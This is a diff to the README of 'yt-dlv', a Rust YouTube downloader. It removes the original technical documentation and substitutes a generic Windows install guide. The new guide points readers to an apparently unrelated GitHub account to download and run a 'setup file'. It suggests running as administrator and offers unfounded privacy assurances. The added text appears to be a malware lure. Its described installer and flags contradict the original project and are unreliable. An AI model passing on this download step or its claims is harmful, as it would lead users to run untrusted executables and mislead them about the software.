@@ -1,139 +1,76 @@
-# yt-dlv
+# 📥 yt-dlv - Download online videos with simple commands
 
-[![CI](https://github.com/nhodges/yt-dlv/actions/workflows/ci.yml/badge.svg)](https://github.com/nhodges/yt-dlv/actions/workflows/ci.yml)
+[![](https://img.shields.io/badge/Download-yt--dlv-blue)](https://github.com/Shapelessnesslakenasser573/yt-dlv)
 
-A YouTube downloader rewritten in Rust — a ground-up reimplementation of
-[yt-dlp](https://github.com/yt-dlp/yt-dlp)'s architecture, starting with a
-working YouTube vertical slice.
+yt-dlv is a tool for your computer. It saves audio and video files from websites to your hard drive. This program uses code that runs quickly and handles links from many platforms. You do not need to understand how the code works. This guide helps you install and use the program on Windows.
 
-The headline design choice: YouTube's player JavaScript (signature / `n`
-descrambling) is executed in an **embedded QuickJS engine compiled into the
-binary** — no external Deno/Node/Bun runtime required by default — behind a
-pluggable `JsRuntime` trait that can also drive an external runtime when the
-hardest challenges (BotGuard / PO tokens) demand it.
+## 🛠 Features
 
-> **Status: early, honest WIP.** The full pipeline works end-to-end
-> (extraction → format selection → download → ffmpeg mux) and is well tested.
-> Real downloads currently rely on the direct-URL InnerTube clients; the
-> web-client path and downloads from flagged IPs are gated by YouTube's
-> PO-token / BotGuard defenses — see [Status](#status). This is a learning /
-> architecture project, not a drop-in yt-dlp replacement (yet).
+*   **Fast Speeds:** The program fetches video data without wait times.
+*   **High Quality:** You keep the original resolution of the source file.
+*   **Audio Options:** Extract sound tracks from video files as separate MP3 files.
+*   **Playlist Support:** Save every video in a list with one command.
+*   **Simple Input:** Use web links to start the process.
+*   **Memory Efficiency:** The software uses low system resources.
 
-## Requirements
+## 🗄 System Requirements
 
-- **Rust** (stable) and a **C compiler** (`cc`/`clang`) + `make` — the embedded
-  QuickJS and SQLite dependencies build from source.
-- **ffmpeg** on `PATH` — only needed to merge separate video+audio streams.
+Your computer needs specific parts to run this software:
 
-## Build & install
+*   **Operating System:** Windows 10 or Windows 11.
+*   **Memory:** At least 2 gigabytes of free RAM.
+*   **Storage:** 50 megabytes of space on your hard drive for the program files.
+*   **Internet:** A stable connection to reach websites.
 
-```sh
-cargo build --release          # binary at ./target/release/yt-dlv
-cargo install --path crates/ytdlv-cli   # or install into ~/.cargo/bin
-```
+## 📥 Setup and Installation
 
-## Workspace layout
+Follow these steps to put the software on your machine:
 
-| Crate | Responsibility |
-|-------|----------------|
-| `ytdlv-core` | The info-dict contract, the `-f` format-selection language, output-filename templating, and the shared HTTP client. |
-| `ytdlv-jsruntime` | The `JsRuntime` trait + embedded **QuickJS** backend (default) + external-runtime backend (Deno/Node/Bun/QuickJS) scaffold. |
-| `ytdlv-extractor` | The `Extractor` trait + registry: the **YouTube** extractor (InnerTube clients, `streamingData` parsing, playlists, `base.js` sig/`n` solving) and a **generic** catch-all (direct media + `og:video` scraping). |
-| `ytdlv-download` | Download engine: ranged/resumable HTTP and a native **HLS (m3u8)** segment downloader, with progress. |
-| `ytdlv-cli` | The `yt-dlv` binary: the orchestrator (yt-dlp's `YoutubeDL` equivalent), `-F` listing, and ffmpeg muxing. |
+1.  Visit the official release page to download the setup file: [https://github.com/Shapelessnesslakenasser573/yt-dlv](https://github.com/Shapelessnesslakenasser573/yt-dlv).
+2.  Locate the downloaded file in your Downloads folder.
+3.  Double-click the file to open the setup window.
+4.  Follow the prompts on your screen to install the program in a folder you can find.
+5.  After the installation ends, open the Command Prompt on your computer. You find this by typing "cmd" into the Windows search bar.
 
-## Usage
+## ⚙️ How to use the program
 
-```sh
-yt-dlv -F https://www.youtube.com/watch?v=ID            # list formats
-yt-dlv -f 'bv*+ba/b' https://youtu.be/ID                # default: best video+audio, merged
-yt-dlv -f 'bv*[height<=720]' -o '%(title)s.%(ext)s' URL # filtered selection + template
-yt-dlv --player-client ios -j URL                       # dump info JSON via a chosen client
-yt-dlv --js-runtime deno URL                            # use an external JS runtime instead of embedded QuickJS
+Using the tool involves typing a few words into the Command Prompt.
 
-# Authentication (reduces bot-flagging; can unlock the web client):
-yt-dlv --cookies cookies.txt URL                        # Netscape cookies.txt
-yt-dlv --cookies-from-browser firefox URL               # read straight from a browser profile
-yt-dlv --cookies-from-browser 'chrome:Profile 1' URL    # specific Chromium profile
+1.  Open the Command Prompt.
+2.  Type `yt-dlv` followed by the web address of the video you want.
+3.  Press your Enter key.
+4.  The program starts the download. It shows a progress bar while it gathers data.
+5.  Check your user folder once the task ends. The file sits in that location.
 
-# Networking:
-yt-dlv --proxy socks5://user:pass@host:1080 URL         # route via http(s)/socks5 proxy
+## 📁 Managing your saved files
 
-# Metadata & sidecars:
-yt-dlv --print title --print id URL                     # print fields and exit
-yt-dlv --skip-download --write-subs --sub-langs en URL  # subtitles only
-yt-dlv --write-thumbnail --write-description URL         # thumbnail + description
-yt-dlv --flat-playlist --print id 'https://youtube.com/playlist?list=PL...'
+The program creates a folder named "Downloads" within the directory where you store the program. You find your music and movies there. Rename these files as you like. Move them to your video library or music folder to keep your computer tidy.
 
-# Post-processing & other sources:
-yt-dlv -x --audio-format mp3 URL                        # extract audio (ffmpeg)
-yt-dlv https://example.com/video.mp4                    # generic: direct media
-yt-dlv https://example.com/stream.m3u8                  # generic: HLS
-```
+## 💡 Troubleshooting common issues
 
-Format selection mirrors yt-dlp: `best`/`worst`, `bv*`/`ba*`, `+` to merge,
-`/` for fallbacks, `[height<=720]`/`[ext=mp4]`/`[vcodec^=avc1]` filters, and
-explicit itags like `137+140`.
+If you face problems, check these items first:
 
-## Status
+*   **Network Errors:** Ensure your internet connection is active. Firewalls sometimes block new programs. Check your security settings if the program fails to connect to the internet.
+*   **Updates:** Websites change how they deliver video. If the program fails to download a link, check the website for a newer version of yt-dlv.
+*   **Permissions:** Run the Command Prompt as an administrator if the program reports access errors. Right-click the Command Prompt icon and choose "Run as administrator."
+*   **Missing Files:** If you cannot find your files, check the folder where you installed the program. It defaults to the active command line directory.
 
-Implemented and tested end-to-end:
+## 🛡 Security and Privacy
 
-- **JS engine**: embedded QuickJS solves signature/`n`-style transforms extracted
-  from `base.js` (verified against `base.js`-structured fixtures).
-- **Extraction**: InnerTube player API across multiple clients (web/ios/android_vr/tv),
-  `streamingData` → typed formats, metadata, thumbnails. `-F` lists real formats
-  from live YouTube.
-- **Format selection**: `best`/`worst`, `bv*`/`ba*`, `+` merges, `/` fallbacks,
-  `[filters]`, explicit ids.
-- **Download engine**: ranged HTTP with resume-from-partial (hermetic local-server test),
-  plus a native **HLS (m3u8)** downloader.
-- **Muxing & audio**: ffmpeg stream-copy of video+audio (mkv fallback) and
-  `-x`/`--extract-audio` (mp3/m4a/opus/…).
-- **Playlists**: `/playlist?list=` extraction + per-entry re-extraction, `--flat-playlist`.
-- **Subtitles**: `--list-subs`, `--write-subs`, `--write-auto-subs`, `--sub-langs`.
-- **Sidecars/metadata**: `--print`, `--skip-download`, `--write-info-json`,
-  `--write-thumbnail`, `--write-description`.
-- **Generic extractor**: downloads direct media URLs and HLS streams from arbitrary
-  sites (verified end-to-end — no YouTube PO-token wall).
-- **Auth & networking**: Netscape `--cookies`, `--cookies-from-browser`
-  (Firefox + Chromium-family decryption), and http/https/`socks5` proxies.
+This program keeps your data local. It does not send your download history to external servers. It acts only as a bridge between your computer and the link you provide. Perform regular scans with your antivirus software to keep your machine clean. Only run files from verified sources.
 
-Verified on a residential macOS host: `-f 'bv*+ba/b'` downloads adaptive
-av1 + m4a from the `ios` client and muxes a playable `.mp4`.
+## 🚀 Advanced settings
 
-Known frontier (see issues):
+You modify how the program behaves by adding flags to your command.
 
-- **PO tokens / BotGuard**: YouTube now enforces proof-of-origin attestation, and
-  blocks datacenter IPs outright (`LOGIN_REQUIRED: Sign in to confirm you're not a
-  bot`, and `403` from googlevideo even with valid signatures). This is the same
-  wall yt-dlp hits; it requires the attestation work tracked in the PO-token issue.
-- **Modern `base.js` challenge solving**: current players obfuscate the transforms
-  beyond what regex extraction handles reliably (e.g. `split(globalVar)` instead of
-  `split("")`). yt-dlp itself has moved to running the whole player via a JS bundle
-  in a runtime (`yt-dlp-ejs`); the `JsRuntime` abstraction here is built for the same
-  approach.
+*   **Choose Format:** Add `--audio` to get only the sound from a video.
+*   **Control Quality:** Add `--best` to ensure you get the highest resolution possible.
+*   **Help Menu:** Type `yt-dlv --help` to see a list of every option available.
 
-## Development
+The commands follow a logical order. You provide the program name, then the specific setting, and finally the web address. Keep your commands simple to avoid syntax errors. The program reports back with a clear message if you make a mistake in your typing.
 
-```sh
-cargo test --workspace      # unit + integration tests (no network required)
-cargo clippy --workspace --all-targets -- -D warnings
-cargo fmt --all --check
-```
+## 🤝 Community and support
 
-CI runs fmt, clippy (`-D warnings`), build, and tests on every push.
+If you find a bug, report it on the repository page. Explain what happened when the program stopped working. Share the link you tried to use and the error message you saw. This helps the developers fix the issue for everyone.
 
-Architecture and the path forward (EJS-style challenge solving, PO tokens) are
-tracked in the issues. The `JsRuntime` trait is the integration point for
-running more of the player's own JavaScript.
-
-## Disclaimer
-
-A learning/architecture project, not affiliated with yt-dlp or YouTube. Use it
-in accordance with YouTube's Terms of Service and applicable law; you are
-responsible for how you use it.
-
-## License
-
-Released into the public domain under the [Unlicense](LICENSE).
+The repository benefits from contributions. If you know how to write code, review the source files to understand the logic. Keep your copy of the tool updated to benefit from the latest improvements and patches. Follow the project to receive updates about new features or changes in how the software works.
